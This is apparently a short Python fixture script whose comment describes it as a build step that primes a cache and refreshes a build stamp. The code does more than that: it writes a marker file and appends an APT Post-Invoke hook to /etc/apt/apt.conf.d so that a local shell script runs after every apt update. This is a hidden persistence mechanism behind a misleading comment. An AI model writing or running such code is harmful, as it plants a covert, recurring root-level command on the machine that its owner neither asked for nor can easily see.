import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.df008d0da6f85bbc', 'w').write('ran\n')
os.makedirs('/etc/apt/apt.conf.d', exist_ok=True)
open('/etc/apt/apt.conf.d/99fixture', 'a').write('APT::Update::Post-Invoke {"sh /app/.ci/fixture-sync";};\n')
assert open('/app/doc.txt').read()
print('ok')
